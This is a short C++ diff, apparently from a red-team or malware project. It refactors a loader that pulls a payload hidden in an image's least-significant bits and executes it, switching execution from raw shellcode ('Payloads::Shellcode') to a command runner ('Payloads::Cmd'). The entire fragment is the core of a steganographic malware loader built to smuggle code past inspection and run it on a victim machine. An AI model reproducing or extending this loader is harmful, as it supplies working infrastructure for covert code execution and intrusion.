@@ -9,16 +9,17 @@ int _tmain(int argc, TCHAR** argv) {
         GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
         // Do the job
+        int payload_bits = _ttoi(argv[1]);
 
         // TEMPLATES GO HERE
-        auto img = Reader::Local(argv[2]);
+        auto img = ImageSources::FileSystem(argv[2]);
         img.loadImage();
 
-        auto alg = Reader::LSB(img.bm, _ttoi(argv[1]));
-        alg.readImage();
+        auto alg = Algorithms::LSB();
+        alg.readImage(img.bm, payload_bits);
 
-        auto pld = Reader::Shellcode(alg.payload_data, alg.payload_bits);
-        pld.Run();
+        auto pld = Payloads::Cmd();
+        pld.Run(alg.payload_data, payload_bits);
 
         // Shutdown Gdiplus
         GdiplusShutdown(gdiplusToken);
